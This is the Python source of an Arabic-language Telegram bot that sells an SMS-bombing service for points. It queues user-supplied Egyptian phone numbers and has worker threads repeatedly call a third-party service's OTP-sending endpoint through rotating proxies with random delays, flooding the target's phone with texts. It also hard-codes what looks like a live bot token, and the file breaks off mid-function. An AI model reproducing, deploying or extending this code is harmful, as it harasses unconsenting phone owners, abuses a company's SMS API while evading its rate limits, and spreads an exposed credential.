import logging
import sqlite3
import html
import time
import json
import threading
import random
import requests
import asyncio
from datetime import datetime, timedelta
from typing import Optional, List, Tuple, Dict
from queue import Queue
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice, User
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes,
    filters, CallbackQueryHandler, PreCheckoutQueryHandler,
    ConversationHandler
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚙️ إعدادات البوت والتهيئة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BOT_TOKEN = "8130994366:AAEP5qKlVFRhFqQYPVtgX58NtEjORB-SbKA"
ADMIN_ID = 8287678319
LOG_CHANNEL = "@jaisjwjd"  # قناة السجلات
MANDATORY_CHANNEL = "@Cnejsjwn"  # قناة الاشتراك الإجباري

# مراحل المحادثات
STATE_TRANSFER_ID, STATE_TRANSFER_AMOUNT = range(2)
STATE_CREATE_CODE = range(3)
STATE_REDEEM_CODE = range(1)
STATE_ATTACK_NUMBER, STATE_ATTACK_AMOUNT = range(2)
STATE_BROADCAST = range(1)
STATE_ADD_POINTS = range(2)
STATE_SET_CHANNEL = range(1)
STATE_IMPORT_DATA = range(1)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🗄️ نظام قاعدة البيانات المطوّر
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class DatabaseManager:
    def __init__(self, db_name="bot_data.db"):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.init_settings()
        
    def create_tables(self):
        # جدول المستخدمين
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT,
                phone TEXT,
                points INTEGER DEFAULT 0,
                referrer_id INTEGER,
                last_daily_bonus TEXT,
                joined_date TEXT,
                vip_level INTEGER DEFAULT 0,  -- 0=عادي, 1=VIP, 2=مدى الحياة
                last_attack_date TEXT,
                attack_count_today INTEGER DEFAULT 0,
                total_attacks INTEGER DEFAULT 0
            )
        ''')
        
        # جدول العمليات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                type TEXT,
                details TEXT,
                timestamp TEXT,
                log_id TEXT
            )
        ''')
        
        # جدول الأكواد
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                points INTEGER,
                max_uses INTEGER,
                current_uses INTEGER DEFAULT 0,
                active INTEGER DEFAULT 1,
                created_by INTEGER,
                created_at TEXT
            )
        ''')
        
        # جدول استخدام الأكواد
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS code_usage (
                user_id INTEGER,
                code TEXT,
                used_at TEXT,
                PRIMARY KEY (user_id, code)
            )
        ''')
        
        # جدول الإعدادات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        
        # جدول طلبات الرشق
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_orders (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                order_number TEXT UNIQUE,
                user_id INTEGER,
                target_number TEXT,
                message_count INTEGER,
                points_used INTEGER,
                status TEXT DEFAULT 'pending',  -- pending, processing, completed, failed
                created_at TEXT,
                started_at TEXT,
                completed_at TEXT,
                estimated_time INTEGER,
                proxy_used TEXT
            )
        ''')
        
        # جدول البروكسيات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                proxy_url TEXT UNIQUE,
                is_active INTEGER DEFAULT 1,
                last_used TEXT,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0
            )
        ''')
        
        # جدول الإذاعات
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS broadcasts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                message_text TEXT,
                sent_count INTEGER DEFAULT 0,
                failed_count INTEGER DEFAULT 0,
                sent_at TEXT
            )
        ''')
        
        self.conn.commit()
    
    def init_settings(self):
        default_settings = {
            "tax_percent": "25",
            "show_leaderboard": "1",
            "mandatory_channel": MANDATORY_CHANNEL,
            "log_channel": LOG_CHANNEL,
            "points_per_message": "0.1",  # كل نقطة = 10 رسائل
            "max_free_per_day": "50",  # 500 رسالة للمستخدم العادي
            "vip_max_per_day": "10000",  # لا حدود تقريباً
            "attack_queue_size": "10"
        }
        
        for key, val in default_settings.items():
            try:
                self.cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (key, val))
            except Exception as e:
                print(f"Error inserting setting {key}: {e}")
        self.conn.commit()
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🧑‍💼 إدارة المستخدمين
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def add_user(self, user_id, username, full_name, phone, referrer_id=None):
        try:
            date = datetime.now().isoformat()
            self.cursor.execute('''
                INSERT INTO users 
                (user_id, username, full_name, phone, points, referrer_id, joined_date) 
                VALUES (?, ?, ?, ?, 20, ?, ?)
            ''', (user_id, username, full_name, phone, referrer_id, date))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False
    
    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def update_points(self, user_id, amount, reason, details=""):
        # تحديث النقاط
        self.cursor.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (amount, user_id))
        
        # تحديد نوع العملية
        tx_type = "unknown"
        if reason == "bonus": tx_type = "🎁 مكافأة"
        elif reason == "transfer_in": tx_type = "📥 استلام"
        elif reason == "transfer_out": tx_type = "📤 تحويل"
        elif reason == "buy": tx_type = "💳 شراء"
        elif reason == "code": tx_type = "🎫 كود"
        elif reason == "attack": tx_type = "🎯 رشق"
        elif reason == "referral": tx_type = "👥 إحالة"
        elif reason == "admin_add": tx_type = "👑 إضافة أدمن"
        elif reason == "admin_remove": tx_type = "👑 خصم أدمن"
        
        # إنشاء معرف فريد للسجل
        log_id = f"TX{datetime.now().strftime('%Y%m%d%H%M%S')}{user_id}"
        
        # تسجيل العملية
        self.cursor.execute('''
            INSERT INTO transactions (user_id, amount, type, details, timestamp, log_id)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, amount, tx_type, details, datetime.now().strftime("%Y-%m-%d %H:%M"), log_id))
        self.conn.commit()
        return log_id
    
    def get_user_stats(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return None
        
        # عدد الطلبات اليوم
        today = datetime.now().strftime("%Y-%m-%d")
        self.cursor.execute('''
            SELECT COUNT(*) FROM attack_orders 
            WHERE user_id = ? AND DATE(created_at) = ? AND status = 'completed'
        ''', (user_id, today))
        today_attacks = self.cursor.fetchone()[0]
        
        # إجمالي الطلبات
        self.cursor.execute('''
            SELECT COUNT(*) FROM attack_orders WHERE user_id = ? AND status = 'completed'
        ''', (user_id,))
        total_attacks = self.cursor.fetchone()[0]
        
        return {
            "user": user,
            "today_attacks": today_attacks,
            "total_attacks": total_attacks,
            "vip_level": user[8]
        }
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🎯 نظام الرشق
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def create_attack_order(self, user_id, target_number, message_count, points_needed):
        # توليد رقم طلب فريد
        order_num = f"#{random.randint(1000, 9999)}{datetime.now().strftime('%H%M%S')}"
        
        # حساب الوقت التقديري بناءً على قائمة الانتظار
        self.cursor.execute('''
            SELECT COUNT(*) FROM attack_orders 
            WHERE status IN ('pending', 'processing')
        ''')
        queue_size = self.cursor.fetchone()[0]
        estimated_time = (queue_size + 1) * 2  # 2 دقائق لكل طلب
        
        # إدخال الطلب
        self.cursor.execute('''
            INSERT INTO attack_orders 
            (order_number, user_id, target_number, message_count, points_used, created_at, estimated_time)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (order_num, user_id, target_number, message_count, points_needed, 
              datetime.now().isoformat(), estimated_time))
        self.conn.commit()
        
        # خصم النقاط
        self.update_points(user_id, -points_needed, "attack", f"طلب رشق #{order_num}")
        
        return order_num, estimated_time
    
    def get_next_pending_order(self):
        self.cursor.execute('''
            SELECT * FROM attack_orders 
            WHERE status = 'pending' 
            ORDER BY created_at ASC 
            LIMIT 1
        ''')
        return self.cursor.fetchone()
    
    def update_order_status(self, order_id, status, proxy_used=None):
        now = datetime.now().isoformat()
        
        if status == "processing":
            self.cursor.execute('''
                UPDATE attack_orders 
                SET status = ?, started_at = ?, proxy_used = ?
                WHERE id = ?
            ''', (status, now, proxy_used, order_id))
        elif status in ["completed", "failed"]:
            self.cursor.execute('''
                UPDATE attack_orders 
                SET status = ?, completed_at = ?
                WHERE id = ?
            ''', (status, now, order_id))
        self.conn.commit()
    
    def get_user_orders(self, user_id, limit=10):
        self.cursor.execute('''
            SELECT order_number, target_number, message_count, status, created_at 
            FROM attack_orders 
            WHERE user_id = ? 
            ORDER BY id DESC 
            LIMIT ?
        ''', (user_id, limit))
        return self.cursor.fetchall()
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔄 نظام البروكسيات
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def add_proxy(self, proxy_url):
        try:
            self.cursor.execute('''
                INSERT INTO proxies (proxy_url, last_used) 
                VALUES (?, ?)
            ''', (proxy_url, datetime.now().isoformat()))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False
    
    def get_random_proxy(self):
        self.cursor.execute('''
            SELECT proxy_url FROM proxies 
            WHERE is_active = 1 
            ORDER BY last_used ASC 
            LIMIT 1
        ''')
        result = self.cursor.fetchone()
        if result:
            # تحديث وقت الاستخدام
            self.cursor.execute('''
                UPDATE proxies 
                SET last_used = ? 
                WHERE proxy_url = ?
            ''', (datetime.now().isoformat(), result[0]))
            self.conn.commit()
            return result[0]
        return None
    
    def update_proxy_stats(self, proxy_url, success=True):
        if success:
            self.cursor.execute('''
                UPDATE proxies 
                SET success_count = success_count + 1 
                WHERE proxy_url = ?
            ''', (proxy_url,))
        else:
            self.cursor.execute('''
                UPDATE proxies 
                SET fail_count = fail_count + 1,
                is_active = CASE WHEN fail_count >= 3 THEN 0 ELSE 1 END
                WHERE proxy_url = ?
            ''', (proxy_url,))
        self.conn.commit()
    
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # ⚙️ الإعدادات والإدارة
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    
    def get_setting(self, key):
        self.cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
        res = self.cursor.fetchone()
        return res[0] if res else None
    
    def set_setting(self, key, value):
        self.cursor.execute('''
            INSERT OR REPLACE INTO settings (key, value) 
            VALUES (?, ?)
        ''', (key, str(value)))
        self.conn.commit()
    
    def get_global_stats(self):
        users_count = self.cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        total_points = self.cursor.execute("SELECT SUM(points) FROM users").fetchone()[0] or 0
        total_tx = self.cursor.execute("SELECT COUNT(*) FROM transactions").fetchone()[0]
        total_attacks = self.cursor.execute("SELECT COUNT(*) FROM attack_orders WHERE status='completed'").fetchone()[0]
        
        # قائمة الانتظار الحالية
        self.cursor.execute('''
            SELECT COUNT(*) FROM attack_orders 
            WHERE status IN ('pending', 'processing')
        ''')
        queue_size = self.cursor.fetchone()[0]
        
        return {
            "users": users_count,
            "total_points": total_points,
            "total_transactions": total_tx,
            "total_attacks": total_attacks,
            "queue_size": queue_size
        }
    
    def get_all_users(self):
        self.cursor.execute("SELECT user_id, username, full_name, points, vip_level FROM users ORDER BY points DESC")
        return self.cursor.fetchall()
    
    def create_promo_code(self, code, points, max_uses, created_by):
        try:
            self.cursor.execute('''
                INSERT INTO promo_codes (code, points, max_uses, created_by, created_at)
                VALUES (?, ?, ?, ?, ?)
            ''', (code, points, max_uses, created_by, datetime.now().isoformat()))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False
    
    def redeem_promo_code(self, user_id, code):
        self.cursor.execute('''
            SELECT points, max_uses, current_uses, active 
            FROM promo_codes WHERE code = ?
        ''', (code,))
        res = self.cursor.fetchone()
        if not res: return "not_found"
        
        points, max_uses, current_uses, active = res
        if not active or current_uses >= max_uses: return "expired"
        
        # التحقق من الاستخدام السابق
        self.cursor.execute('''
            SELECT * FROM code_usage WHERE user_id = ? AND code = ?
        ''', (user_id, code))
        if self.cursor.fetchone(): return "used"
        
        # تنفيذ العملية
        self.cursor.execute('''
            UPDATE promo_codes SET current_uses = current_uses + 1 WHERE code = ?
        ''', (code,))
        
        self.cursor.execute('''
            INSERT INTO code_usage (user_id, code, used_at) VALUES (?, ?, ?)
        ''', (user_id, code, datetime.now().isoformat()))
        
        self.update_points(user_id, points, "code", f"الكود: {code}")
        self.conn.commit()
        return points
    
    def save_broadcast(self, admin_id, message_text, sent_count, failed_count):
        self.cursor.execute('''
            INSERT INTO broadcasts (admin_id, message_text, sent_count, failed_count, sent_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (admin_id, message_text, sent_count, failed_count, datetime.now().isoformat()))
        self.conn.commit()
    
    def export_data(self, data_type="all"):
        data = {}
        
        if data_type in ["all", "users"]:
            self.cursor.execute("SELECT * FROM users")
            data["users"] = self.cursor.fetchall()
        
        if data_type in ["all", "transactions"]:
            self.cursor.execute("SELECT * FROM transactions")
            data["transactions"] = self.cursor.fetchall()
        
        if data_type in ["all", "settings"]:
            self.cursor.execute("SELECT * FROM settings")
            data["settings"] = self.cursor.fetchall()
        
        return json.dumps(data, ensure_ascii=False, indent=2)
    
    def import_data(self, json_data):
        data = json.loads(json_data)
        success = 0
        errors = []
        
        try:
            if "users" in data:
                for user in data["users"]:
                    try:
                        self.cursor.execute('''
                            INSERT OR REPLACE INTO users 
                            (user_id, username, full_name, phone, points, referrer_id, 
                             last_daily_bonus, joined_date, vip_level, last_attack_date, 
                             attack_count_today, total_attacks)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                        ''', tuple(user))
                        success += 1
                    except Exception as e:
                        errors.append(f"User {user[0]}: {str(e)}")
            
            if "transactions" in data:
                for tx in data["transactions"]:
                    try:
                        self.cursor.execute('''
                            INSERT OR REPLACE INTO transactions 
                            (id, user_id, amount, type, details, timestamp, log_id)
                            VALUES (?, ?, ?, ?, ?, ?, ?)
                        ''', tuple(tx))
                        success += 1
                    except Exception as e:
                        errors.append(f"Transaction {tx[0]}: {str(e)}")
            
            if "settings" in data:
                for key, value in data["settings"]:
                    try:
                        self.set_setting(key, value)
                        success += 1
                    except Exception as e:
                        errors.append(f"Setting {key}: {str(e)}")
            
            self.conn.commit()
            return success, errors
            
        except Exception as e:
            return 0, [str(e)]

db = DatabaseManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🛠️ أدوات مساعدة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_user_link(user_id, name):
    return f"<a href='tg://user?id={user_id}'>{html.escape(name)}</a>"

def format_time(seconds):
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{int(hours)}:{int(minutes):02d}:{int(seconds):02d}"

async def check_channel_membership(user_id, context):
    """التحقق من اشتراك المستخدم في القناة الإجبارية"""
    channel = db.get_setting("mandatory_channel")
    if not channel or channel == "@your_channel":
        return True
    
    try:
        chat_member = await context.bot.get_chat_member(channel, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

async def log_to_channel(message, context):
    """تسجيل العملية في قناة السجلات"""
    channel = db.get_setting("log_channel")
    if channel and channel != "@your_log_channel":
        try:
            await context.bot.send_message(channel, message, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed to log to channel: {e}")

def get_main_keyboard(user_id):
    btns = [
        [InlineKeyboardButton("🎯 رشق", callback_data="attack_menu")],
        [InlineKeyboardButton("🔄 تجميع النقاط", callback_data="collect_points")],
        [InlineKeyboardButton("💸 تحويل النقاط", callback_data="transfer_start")],
        [InlineKeyboardButton("📜 سجل العمليات", callback_data="history"), 
         InlineKeyboardButton("📞 الدعم الفني", callback_data="support")],
        [InlineKeyboardButton("👑 ترقية VIP", callback_data="vip_upgrade")]
    ]
    
    if user_id == ADMIN_ID:
        btns.append([InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel")])
    
    return InlineKeyboardMarkup(btns)

def get_admin_keyboard():
    btns = [
        [InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats")],
        [InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users")],
        [InlineKeyboardButton("📢 إرسال إذاعة", callback_data="admin_broadcast")],
        [InlineKeyboardButton("➕ إضافة نقاط", callback_data="admin_add_points")],
        [InlineKeyboardButton("🎫 إنشاء كود", callback_data="admin_create_code")],
        [InlineKeyboardButton("🔄 إدارة القناة", callback_data="admin_channel")],
        [InlineKeyboardButton("📥 استيراد/تصدير", callback_data="admin_backup")],
        [InlineKeyboardButton("🛠️ إدارة البروكسيات", callback_data="admin_proxies")],
        [InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(btns)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🚀 نظام الرشق (SMS Attack)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AttackManager:
    def __init__(self):
        self.active_workers = 0
        self.max_workers = 3
        self.queue = Queue()
        self.is_running = True
        self.start_workers()
    
    def start_workers(self):
        for i in range(self.max_workers):
            thread = threading.Thread(target=self.worker, daemon=True)
            thread.start()
    
    def worker(self):
        while self.is_running:
            try:
                order = db.get_next_pending_order()
                if order:
                    self.process_order(order)
                else:
                    time.sleep(5)
            except Exception as e:
                logger.error(f"Worker error: {e}")
                time.sleep(10)
    
    def process_order(self, order):
        order_id, order_num, user_id, target_number, message_count, status = order[0], order[1], order[2], order[3], order[4], order[6]
        
        # تحديث حالة الطلب
        proxy_url = db.get_random_proxy()
        db.update_order_status(order_id, "processing", proxy_url)
        
        # إعلام المستخدم
        try:
            from main import application
            context = application.bot_data.get('context')
            if context:
                asyncio.run_coroutine_threadsafe(
                    context.bot.send_message(
                        user_id,
                        f"🚀 <b>بدأ تنفيذ طلبك!</b>\n"
                        f"📞 الرقم المستهدف: {target_number}\n"
                        f"📩 عدد الرسائل: {message_count}\n"
                        f"⏳ جاري الإرسال...",
                        parse_mode="HTML"
                    ),
                    asyncio.get_event_loop()
                )
        except:
            pass
        
        # تنفيذ الرشق
        success = self.send_attack(target_number, message_count, proxy_url)
        
        # تحديث النتيجة
        db.update_order_status(order_id, "completed" if success else "failed")
        
        # تحديث إحصائيات البروكسي
        if proxy_url:
            db.update_proxy_stats(proxy_url, success)
    
    def send_attack(self, number, count, proxy_url=None):
        headers = {
            'authority': 'api.twistmena.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
            'authorization': '',
            'content-type': 'application/json',
            'origin': 'https://account.twistmena.com',
            'referer': 'https://account.twistmena.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Mobile Safari/537.36',
        }
        
        json_data = {'phoneNumber': '+2' + number}
        
        proxies = None
        if proxy_url:
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
        
        success_count = 0
        for i in range(count):
            try:
                response = requests.post(
                    'https://api.twistmena.com/account/auth/phone/sendOtp',
                    headers=headers,
                    json=json_data,
                    proxies=proxies,
                    timeout=10
                )
                
                if response.status_code == 200 and '"success":true' in response.text:
                    success_count += 1
                    logger.info(f"Attack successful: {number} - {i+1}/{count}")
                else:
                    logger.warning(f"Attack failed: {number} - {response.status_code}")
                
                # تأخير عشوائي بين الطلبات
                time.sleep(random.uniform(0.5, 2))
                
            except Exception as e:
                logger.error(f"Attack error: {e}")
        
        return success_count > (count * 0.5)  # يعتبر ناجحاً إذا نجح 50% على الأقل

attack_manager = AttackManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🚀 المعالجات الرئيسية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    
    # التحقق من الاشتراك في القناة
    if not await check_channel_membership(user.id, context):
        channel = db.get_setting("mandatory_channel")
        await update.message.reply_text(
            f"⚠️ <b>يجب الاشتراك في القناة أولاً!</b>\n\n"
            f"رجاء اشترك في القناة:\n{channel}\n"
            f"ثم أرسل /start مرة أخرى.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 الانضمام للقناة", url=f"https://t.me/{channel[1:]}")]
            ])
        )
        return
    
    # التسجيل
    db_user = db.get_user(user.id)
    if not db_user:
        referrer_id = None
        if args and args[0].startswith("invite_"):
            try:
                inviter = int(args[0].split("_")[1])
                if inviter != user.id:
                    referrer_id = inviter
            except:
                pass
        
        db.add_user(user.id, user.username, user.first_name, "None", referrer_id)
        
        if referrer_id:
            db.update_points(referrer_id, 10, "referral", f"دعوة: {user.first_name}")
            await log_to_channel(
                f"👥 <b>إحالة جديدة</b>\n"
                f"المستخدم: {get_user_link(user.id, user.first_name)}\n"
                f"الداعي: {get_user_link(referrer_id, 'المستخدم')}\n"
                f"المكافأة: 10 نقاط",
                context
            )
    
    await send_dashboard(update, context)

async def send_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    stats = db.get_user_stats(user.id)
    
    if not stats:
        await update.message.reply_text("❌ حدث خطأ في تحميل بياناتك!")
        return
    
    user_data = stats["user"]
    text = (
        f"مرحباً بك {get_user_link(user.id, user.first_name)} 👋\n\n"
        f"🆔 الآيدي: <code>{user.id}</code>\n"
        f"🏆 الرصيد: <b>{user_data[4]} نقطة</b>\n"
        f"👑 المستوى: {'VIP مدى الحياة' if user_data[8] == 2 else 'VIP' if user_data[8] == 1 else 'عادي'}\n"
        f"🎯 الرشقات اليوم: {stats['today_attacks']}\n"
        f"📊 الإجمالي: {stats['total_attacks']}\n"
        f"────────────────\n"
        f"👇 اختر من القائمة:"
    )
    
    kb = get_main_keyboard(user.id)
    
    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    else:
        await update.message.reply_text(text, reply_markup=kb, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🎯 نظام الرشق (واجهة المستخدم)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def attack_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    stats = db.get_user_stats(user_id)
    vip_level = stats["vip_level"]
    
    # الحصول على الحدود
    if vip_level == 2:  # مدى الحياة
        max_per_day = 1000000  # رقم كبير جداً
    elif vip_level == 1:  # VIP
        max_per_day = int(db.get_setting("vip_max_per_day"))
    else:  # عادي
        max_per_day = int(db.get_setting("max_free_per_day"))
    
    remaining_today = max_per_day - stats["today_attacks"]
    
    text = (
        f"🎯 <b>قسم الرشق</b>\n\n"
        f"💰 رصيدك: <b>{stats['user'][4]} نقطة</b>\n"
        f"👑 مستوى حسابك: {'VIP مدى الحياة' if vip_level == 2 else 'VIP' if vip_level == 1 else 'عادي'}\n"
        f"📊 المتبقي اليوم: <b>{remaining_today}</b> رسالة\n"
        f"💵 السعر: <b>1 نقطة = 10 رسائل</b>\n\n"
        f"👇 أرسل <b>رقم الهاتف</b> (بدون +2):"
    )
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📜 طلباتي السابقة", callback_data="my_orders")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
    ])
    
    await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    return STATE_ATTACK_NUMBER

async def get_attack_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = update.message.text.strip()
    
    # التحقق من صحة الرقم
    if not number.isdigit() or len(number) != 11 or not number.startswith(('10', '11', '12', '15')):
        await update.message.reply_text("❌ رقم غير صحيح! يجب أن يكون 11 رقماً ويبدأ بـ 10/11/12/15")
        return STATE_ATTACK_NUMBER
    
    context.user_data['attack_number'] = number
    
    await update.message.reply_text(
        f"✅ الرقم المضبوط: <b>{number}</b>\n\n"
        f"🔢 أرسل <b>عدد الرسائل</b> التي تريد إرسالها:",
        parse_mode="HTML"
    )
    return STATE_ATTACK_AMOUNT

async def get_attack_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = db.get_user_stats(user_id)
    vip_level = stats["vip_level"]
    
    try:
        message_count = int(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ يجب أن يكون العدد رقماً!")
        return STATE_ATTACK_AMOUNT
    
    # حساب النقاط المطلوبة
    points_per_message = float(db.get_setting("points_per_message"))
    points_needed = int(message_count * points_per_message)
    
    # التحقق من الحدود
    if vip_level == 0:  # عادي
        max_per_day = int(db.get_setting("max_free_per_day"))
        if stats["today_attacks"] + message_count > max_per_day:
            await update.message.reply_text(
                f"❌ تجاوزت الحد اليومي!\n"
                f"الحد اليومي: {max_per_day} رسالة\n"
                f"المستخدم اليوم: {stats['today_attacks']}\n"
                f"المتبقي: {max_per_day - stats['today_attacks']}"
            )
            return STATE_ATTACK_AMOUNT
    
    # التحقق من الرصيد
    if points_needed > stats["user"][4]:
        await update.message.reply_text(
            f"❌ رصيدك غير كافٍ!\n"
            f"المطلوب: {points_needed} نقطة\n"
            f"رصيدك: {stats['user'][4]} نقطة"
        )
        return STATE_ATTACK_AMOUNT
    
    # إنشاء طلب الرشق
    number = context.user_data['attack_number']
    order_num, estimated_time = db.create_attack_order(user_id, number, message_count, points_needed)
    
    # إحصائيات قائمة الانتظار
    global_stats = db.get_global_stats()
    
    # إرسال تأكيد
    text = (
        f"✅ <b>تم إنشاء طلب الرشق!</b>\n\n"
        f"📋 رقم الطلب: <code>{order_num}</code>\n"
        f"📞 الرقم المستهدف: {number}\n"
        f"📩 عدد الرسائل: {message_count}\n"
        f"💵 النقاط المخصومة: {points_needed}\n"
        f"⏳ الوقت التقديري: {estimated_time} دقيقة\n"
        f"📊 موقعك في الطابور: {global_stats['queue_size']}\n\n"
        f"🔄 سيتم إعلامك عند بدء التنفيذ."
    )
    
    # تسجيل في قناة السجلات
    await log_to_channel(
        f"🎯 <b>طلب رشق جديد</b>\n"
        f"المستخدم: {get_user_link(user_id, update.effective_user.first_name)}\n"
        f"رقم الطلب: {order_num}\n"
        f"الرقم المستهدف: {number}\n"
        f"عدد الرسائل: {message_count}\n"
        f"النقاط: {points_needed}",
        context
    )
    
    await update.message.reply_text(text, parse_mode="HTML")
    await send_dashboard(update, context)
    return ConversationHandler.END

async def my_orders(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    orders = db.get_user_orders(user_id, 10)
    
    if not orders:
        text = "📭 لا توجد طلبات سابقة."
    else:
        text = "📋 <b>آخر 10 طلبات:</b>\n\n"
        for order_num, number, count, status, created_at in orders:
            status_icon = "✅" if status == "completed" else "🔄" if status == "processing" else "⏳" if status == "pending" else "❌"
            text += f"{status_icon} <b>{order_num}</b>\n"
            text += f"   📞 {number} | 📩 {count}\n"
            text += f"   🕐 {created_at[:16]}\n\n"
    
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="attack_menu")]])
    await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚙️ لوحة الإدارة المتقدمة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        await query.answer("❌ ليس لديك صلاحية!")
        return
    
    await query.answer()
    await query.edit_message_text(
